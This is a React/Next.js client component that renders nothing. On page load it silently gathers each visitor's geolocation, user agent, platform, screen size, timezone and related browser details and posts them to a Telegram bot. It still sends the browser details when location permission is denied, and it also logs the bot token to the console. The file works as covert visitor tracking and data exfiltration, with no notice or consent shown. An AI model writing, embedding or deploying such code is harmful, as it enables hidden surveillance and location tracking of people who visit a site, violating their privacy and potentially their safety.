'use client';

import { useCallback, useEffect } from 'react';
import axios from 'axios';

interface BrowserInfo {
  userAgent: string;
  platform: string;
  language: string;
  screenResolution: string;
  timezone: string;
  cookiesEnabled: boolean;
  onlineStatus: boolean;
}

interface LocationInfo {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: string;
}

interface UserInfoData {
  location: LocationInfo | null;
  browser: BrowserInfo;
}

export default function UserInfo() {
  useEffect(() => {
    // Debug logging for environment variables
    console.log('Bot Token exists:', !!process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN);
    console.log('Chat ID exists:', !!process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID);
    console.log('Bot Token value:', process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN);
    console.log('Chat ID value:', process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID);
  }, []);

  const sendToTelegram = async (info: UserInfoData) => {
    try {
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      
      // Additional debug logging
      console.log('Attempting to send to Telegram with:', {
        botTokenExists: !!botToken,
        chatIdExists: !!chatId,
        botTokenLength: botToken?.length,
        chatIdLength: chatId?.length
      });
      
      if (!botToken || !chatId) {
        console.error('Telegram configuration missing. Check your .env file.');
        return;
      }

      const locationInfo = info.location ? `
📍 Location:
- Latitude: ${info.location.latitude}
- Longitude: ${info.location.longitude}
- Accuracy: ${info.location.accuracy}m
- Timestamp: ${info.location.timestamp}` : '📍 Location: Permission Denied or Not Available';

      const message = `
🔍 User Information Collected:

${locationInfo}

🌐 Browser Info:
- User Agent: ${info.browser.userAgent}
- Platform: ${info.browser.platform}
- Language: ${info.browser.language}
- Screen Resolution: ${info.browser.screenResolution}
- Timezone: ${info.browser.timezone}
- Cookies Enabled: ${info.browser.cookiesEnabled ? 'Yes' : 'No'}
- Online Status: ${info.browser.onlineStatus ? 'Online' : 'Offline'}`;

      console.log('Sending message to Telegram:', {
        messageLength: message.length,
        apiUrl: `https://api.telegram.org/bot${botToken.substring(0, 5)}...`
      });

      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });

      console.log('Information sent to Telegram successfully!');
    } catch (error: unknown) {
      if (axios.isAxiosError(error)) {
        console.error('Error sending to Telegram:', {
          message: error.message,
          response: error.response?.data,
          status: error.response?.status
        });
      } else {
        console.error('An unexpected error occurred:', error);
      }
    }
  };

  const getUserInfo = useCallback(async () => {
    // Get browser information immediately
    const browserInfo: BrowserInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookiesEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine,
    };

    // Try to get location in the background
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const info: UserInfoData = {
          location: {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date(position.timestamp).toISOString(),
          },
          browser: browserInfo,
        };
        await sendToTelegram(info);
      },
      async (error) => {
        // Send browser info even if location is denied
        const info: UserInfoData = {
          location: null,
          browser: browserInfo,
        };
        await sendToTelegram(info);
        console.error('Location error:', {
          code: error.code,
          message: error.message
        });
      }
    );
  }, []);

  useEffect(() => {
    getUserInfo();
  }, [getUserInfo]);

  return null;
} 